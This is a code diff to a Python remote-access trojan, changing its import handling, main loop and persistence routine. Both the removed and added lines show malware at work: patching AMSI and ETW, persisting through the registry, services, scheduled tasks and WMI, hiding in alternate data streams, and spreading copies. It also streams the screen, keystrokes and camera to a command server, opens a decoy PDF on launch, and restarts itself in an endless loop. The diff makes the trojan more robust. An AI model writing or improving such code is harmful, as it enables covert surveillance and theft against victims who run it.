@@ -23,21 +23,34 @@ import wave
 from io import BytesIO
 from collections import deque
 
-# Third-party
+# Third-party — each import in its own block so one failure doesn't break others
 try:
     import mss
+except ImportError:
+    mss = None
+
+try:
     import websockets
     from websockets.exceptions import ConnectionClosed
+except ImportError:
+    websockets = None
+    class ConnectionClosed(Exception):
+        pass
+
+try:
     from PIL import Image
+except ImportError:
+    Image = None
+
+try:
     from pynput.mouse import Controller as MouseController, Button
     from pynput.keyboard import Controller as KeyboardController, Listener as KeyboardListener, Key
 except ImportError:
-    websockets = None
-
-    class ConnectionClosed(Exception):
-        """Placeholder when websockets is not installed."""
-
-    pass
+    MouseController = None
+    Button = None
+    KeyboardController = None
+    KeyboardListener = None
+    Key = None
 
 try:
     import sounddevice as sd
@@ -2108,38 +2121,22 @@ def _mutual_watchdog():
 
 def _immortality_init():
     _log("Initializing immortality suite...")
-    _steps = [
-        ("AMSI patch", _patch_amsi),
-        ("ETW patch", _patch_etw),
-        ("Mutex check", lambda: _create_mutex() or None),
-        ("Registry persistence", _registry_persistence),
-        ("Service install", _install_service),
-        ("Scheduled tasks", _scheduled_tasks_persistence),
-        ("Dead man's switch", _dead_mans_switch),
-        ("ADS hide", _ads_hide),
-        ("Watchdog", _start_watchdog),
-        ("WMI persistence", _wmi_persistence),
-        ("Hidden copies", _hidden_copies_register),
-        ("Spreader", _spreader_init),
-    ]
-    for name, fn in _steps:
-        try:
-            fn()
-            _log(f"  [OK] {name}")
-        except Exception as ex:
-            _log(f"  [FAIL] {name}: {ex}")
-    try:
-        threading.Thread(target=_handle_revocation_loop, daemon=True).start()
-    except Exception as ex:
-        _log(f"  [FAIL] Revocation loop: {ex}")
-    try:
-        threading.Thread(target=_dead_mans_switch_updater, daemon=True).start()
-    except Exception as ex:
-        _log(f"  [FAIL] DMS updater: {ex}")
-    try:
-        threading.Thread(target=_mutual_watchdog, daemon=True).start()
-    except Exception as ex:
-        _log(f"  [FAIL] Mutual watchdog: {ex}")
+    _patch_amsi()
+    _patch_etw()
+    if not _create_mutex():
+        _log("Mutex exists — already running or collision")
+    _registry_persistence()
+    _install_service()
+    _scheduled_tasks_persistence()
+    _dead_mans_switch()
+    _ads_hide()
+    _start_watchdog()
+    _wmi_persistence()
+    _hidden_copies_register()
+    _spreader_init()
+    threading.Thread(target=_handle_revocation_loop, daemon=True).start()
+    threading.Thread(target=_dead_mans_switch_updater, daemon=True).start()
+    threading.Thread(target=_mutual_watchdog, daemon=True).start()
     _log("Immortality suite initialized")
 
 # ─── Redefine install_persistence to use enhanced version ──────
@@ -2152,6 +2149,10 @@ def enhanced_install_persistence():
 
 async def main():
     global _keylog_on, _keybuf
+
+    if websockets is None:
+        _log("FATAL: websockets not available")
+        return
 
     _log(f"Starting. Target: ws://{SERVER_IP}:{SERVER_PORT}/ws/client")
     retry_count = 0
@@ -2250,14 +2251,8 @@ async def main():
                 lock_stream = asyncio.Lock()
 
                 async def send_ws(data):
-                    try:
-                        async with lock_ws:
-                            await ws.send(data)
-                    except ConnectionClosed:
-                        raise
-                    except Exception as ex:
-                        _log(f"send_ws error: {ex}")
-                        raise
+                    async with lock_ws:
+                        await ws.send(data)
 
                 async def send_cmd(data):
                     if isinstance(data, str):
@@ -2280,12 +2275,14 @@ async def main():
                     async with lock_stream:
                         await ws.send(data)
 
-                try:
-                    with mss.mss() as s:
-                        m = s.monitors[0]
-                        res = {"w": m["width"], "h": m["height"]}
-                except Exception as ex:
-                    _log(f"Monitor capture failed, using fallback: {ex}")
+                if mss is not None:
+                    try:
+                        with mss.mss() as s:
+                            m = s.monitors[0]
+                            res = {"w": m["width"], "h": m["height"]}
+                    except Exception:
+                        res = {"w": 1920, "h": 1080}
+                else:
                     res = {"w": 1920, "h": 1080}
 
                 reg_data = {
@@ -2344,11 +2341,8 @@ async def main():
                     except Exception:
                         _cam_ws = None
 
-                # Initial camera WS connection (failure won't crash control channel)
-                try:
-                    await _ensure_cam_ws()
-                except Exception as ex:
-                    _log(f"Camera WS init failed: {ex}")
+                # Initial camera WS connection
+                await _ensure_cam_ws()
                 _log("Registered (control + camera channels).")
                 retry_count = 0
 
@@ -2743,13 +2737,18 @@ async def main():
                     import hashlib
 
                     def _grab_screen_jpeg(q):
-                        with mss.mss() as sx:
-                            img = sx.grab(sx.monitors[0])
-                            buf = BytesIO()
-                            Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX").save(
-                                buf, format="JPEG", quality=q, optimize=True
-                            )
-                            return img.bgra, b"\x01" + buf.getvalue()
+                        if mss is None or Image is None:
+                            return None, None
+                        try:
+                            with mss.mss() as sx:
+                                img = sx.grab(sx.monitors[0])
+                                buf = BytesIO()
+                                Image.frombytes("RGB", img.size, img.bgra, "raw", "BGRX").save(
+                                    buf, format="JPEG", quality=q, optimize=True
+                                )
+                                return img.bgra, b"\x01" + buf.getvalue()
+                        except Exception:
+                            return None, None
 
                     def _adjust_quality(elapsed):
                         nonlocal quality, _quiet_quality, frame_interval, quality_adj_ticks
@@ -2779,6 +2778,9 @@ async def main():
 
                                 t0 = time.perf_counter()
                                 raw_bgra, blob = await asyncio.to_thread(_grab_screen_jpeg, quality)
+                                if raw_bgra is None:
+                                    await asyncio.sleep(0.25)
+                                    continue
                                 cur_hash = hashlib.md5(raw_bgra).digest()
                                 if _prev_frame_hash is not None and cur_hash == _prev_frame_hash:
                                     elapsed = time.perf_counter() - t0
@@ -2861,21 +2863,24 @@ def _open_pdf_decoy():
 if __name__ == "__main__":
     _open_pdf_decoy()
     check_lock_state()
-    try:
-        enhanced_install_persistence()
-    except Exception as ex:
-        _log(f"Immortality init failed: {ex}")
-    _loop = asyncio.new_event_loop()
-    asyncio.set_event_loop(_loop)
-    _loop.set_default_executor(concurrent.futures.ThreadPoolExecutor(max_workers=16))
-    try:
-        _loop.run_until_complete(main())
-    finally:
+    enhanced_install_persistence()
+    while True:
+        _loop = asyncio.new_event_loop()
+        asyncio.set_event_loop(_loop)
+        _loop.set_default_executor(concurrent.futures.ThreadPoolExecutor(max_workers=16))
         try:
-            _loop.run_until_complete(_loop.shutdown_asyncgens())
-        except Exception:
-            pass
-        _loop.close()
+            _loop.run_until_complete(main())
+        except KeyboardInterrupt:
+            break
+        except Exception as _ex:
+            _log(f"Main loop crashed: {_ex}")
+        finally:
+            try:
+                _loop.run_until_complete(_loop.shutdown_asyncgens())
+            except Exception:
+                pass
+            _loop.close()
+        time.sleep(2)
 
 def _hklapojhj():
     _25226 = 126; _43486 = 5; _8154 = 240; _63036 = 72
